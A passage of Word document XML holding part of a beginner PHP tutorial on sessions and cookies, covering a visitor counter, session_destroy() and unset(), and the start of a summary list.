    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="217" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="218" w:author="Unknown">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19" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="220" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>echo</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t xml:space="preserve"> 'You are visitor number ' . $_</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>SESSION[</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>'</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>page_count</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>'];</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="221"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22" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="223" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>?&gt;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="372" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="224" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="225" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Destroying Session Variables</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="226" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="227" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t xml:space="preserve">The </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>session_</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>destroy</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>(</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t xml:space="preserve">) function is used to destroy the whole </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Php</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t xml:space="preserve"> session variables.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="228" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="229" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t xml:space="preserve">If you want to destroy only a session single item, you use the </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>unset(</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>) function.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="230" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="231" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>The code below illustrates how to use both methods.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="232" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="233"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234"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35" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="236" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>session_</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>destroy</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>(</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t xml:space="preserve">); //destroy entire session </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="237"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38" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="239" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>?&gt;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="240" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="241" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>&lt;?</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>php</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:proofErr w:type="gramEnd"/>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="242"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43" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="244" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>unset(</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t xml:space="preserve">$_SESSION['product']); //destroy product session item </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="245" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="246" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="247" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>?&gt;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="248" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="249" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t xml:space="preserve">  </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Session_destroy</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t xml:space="preserve"> removes all the session data including cookies associated with the session.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="250" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="251" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Unset only frees the individual session variables.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="252" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="253" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Other data remains intact.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="372" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="254" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="255" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Summary</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00DC33A6" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="88"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="256" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="lightGray"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="257" w:author="Unknown">
        <w:r w:rsidRPr="00DC33A6">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>Cookies are small files saved on the user’s computer</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00DC33A6" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="88"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="258" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="lightGray"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="259" w:author="Unknown">
        <w:r w:rsidRPr="00DC33A6">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>Cookies can only be read from the issuing domain</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00DC33A6" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="88"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="260" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="lightGray"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="261" w:author="Unknown">
        <w:r w:rsidRPr="00DC33A6">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>Cookies can have an expiry time, if it is not set, then the cookie expires when the browser is closed</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00DC33A6" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="88"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="262" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="lightGray"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="263" w:author="Unknown">
        <w:r w:rsidRPr="00DC33A6">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>Sessions are like global variables stored on the server</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00DC33A6" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="88"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="264" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="lightGray"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="265" w:author="Unknown">
        <w:r w:rsidRPr="00DC33A6">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
